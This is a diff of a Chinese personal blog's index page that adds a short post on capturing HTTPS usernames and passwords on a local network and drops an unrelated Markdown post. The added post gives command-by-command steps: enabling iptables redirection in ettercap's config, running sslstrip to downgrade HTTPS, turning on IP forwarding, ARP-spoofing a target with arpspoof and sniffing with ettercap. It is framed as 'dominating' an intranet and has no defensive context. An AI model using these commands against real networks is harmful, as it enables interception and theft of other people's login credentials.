@@ -240,7 +240,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">111</span>
+          <span class="site-state-item-count">112</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -314,6 +314,148 @@
       
 
       
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://directoree.github.io/post/HTTPS-password/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Catecat">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="˗ˋˏ♡ˎˊ˗">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/post/HTTPS-password/" class="post-title-link" itemprop="url">内网称霸之《HTTPS账号密码获取》</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2018-11-22 01:17:04" itemprop="dateCreated datePublished" datetime="2018-11-22T01:17:04+08:00">2018-11-22</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2018-12-24 20:26:37" itemprop="dateModified" datetime="2018-12-24T20:26:37+08:00">2018-12-24</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Kali-%E5%86%85%E7%BD%91%E7%A7%B0%E9%9C%B8/" itemprop="url" rel="index"><span itemprop="name">Kali-内网称霸</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/post/HTTPS-password/" class="post-meta-item leancloud_visitors" data-flag-title="内网称霸之《HTTPS账号密码获取》" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/post/HTTPS-password/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/post/HTTPS-password/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>⭐<strong>使用工具：arpspoof、ettercap、sslstrip</strong></p>
+<h4 id="一、将HTTPS转换成HTTP"><a href="#一、将HTTPS转换成HTTP" class="headerlink" title="一、将HTTPS转换成HTTP"></a>一、将HTTPS转换成HTTP</h4><table><tr><td bgcolor=#D1EEEE>在获取HTTPS账号、密码的操作前需要修改ettercap的设置，否则无法成功。
+1.先编辑/etc/ettercap/etter.conf下的文件内容，更改ettercap设置；
+1.1输入/etc/ettercap/etter.conf后找到：
+# if you use iptables:
+#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
+#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
+这个地方
+2.改为（去掉两个#）：
+# if you use iptables:
+redir_command_on = "iptables <font color="red">-t</font> nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
+redir_command_off = "iptables <font color="red">-t</font> nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
+3.输入sslstrip -a -f -k 实现https转换成http以获取帐号密码；
+4.在该终端窗口下右键选择“复制SSH渠道(S)”；
+5.接着直接使用HTTP账号密码获取的方法就可以了。
+</td></tr></table>
+
+<blockquote>
+<blockquote>
+<p>vim使用方法：<br>编辑：按下i；<br>保存并退出：按下Esc，然后按Shift和：(冒号)，按下wq，完后按回车；<br>不保存并退出：按下Esc，然后按Shift和：(冒号)，按下q!，完后按回车；</p>
+</blockquote>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ettercap/etter.conf</span><br><span class="line">i</span><br><span class="line">删除两个<span class="comment">#</span></span><br><span class="line">Esc、Shift ：、wq、回车</span><br><span class="line">sslstrip -a -f -k</span><br></pre></td></tr></table></figure>
+<h4 id="二、ARP欺骗和抓包获取HTTPS账号和密码"><a href="#二、ARP欺骗和抓包获取HTTPS账号和密码" class="headerlink" title="二、ARP欺骗和抓包获取HTTPS账号和密码"></a>二、ARP欺骗和抓包获取HTTPS账号和密码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward</span><br><span class="line">arpspoof -i eth0 -t 目标IP 目标主机网关</span><br><span class="line">ettercap -Tq -i eth0</span><br></pre></td></tr></table></figure>
+<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
     
 
 
@@ -1610,119 +1752,6 @@ geolocate        -->利用谷歌地图定位（需要安装谷歌地图）</font
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://directoree.github.io/post/MarkdownUsage/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="Catecat">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="˗ˋˏ♡ˎˊ˗">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/post/MarkdownUsage/" class="post-title-link" itemprop="url">Markdown</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2018-11-14 13:00:45" itemprop="dateCreated datePublished" datetime="2018-11-14T13:00:45+08:00">2018-11-14</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2019-03-22 01:50:16" itemprop="dateModified" datetime="2019-03-22T01:50:16+08:00">2019-03-22</time>
-      </span>
-
-  
-    <span id="/post/MarkdownUsage/" class="post-meta-item leancloud_visitors" data-flag-title="Markdown" title="阅读次数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-eye"></i>
-      </span>
-      <span class="post-meta-item-text">阅读次数：</span>
-      <span class="leancloud-visitors-count"></span>
-    </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/post/MarkdownUsage/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/post/MarkdownUsage/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>45</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p><a target="_blank" rel="noopener" href="http://marxi.co/">1.Markdown在线编辑器</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.zybuluo.com/mdeditor?url=https://www.zybuluo.com/static/editor/md-help.markdown">2.Markdown高级语法大全</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.zybuluo.com/mdeditor">3.Markdown高级语法</a></p>
-<hr>
-<hr>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
 
   
   <nav class="pagination">
@@ -1786,7 +1815,7 @@ geolocate        -->利用谷歌地图定位（需要安装谷歌地图）</font
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">17:14</span>
+    <span title="站点阅读时长">17:18</span>
   </span>
 </div>
 <div class="busuanzi-count">
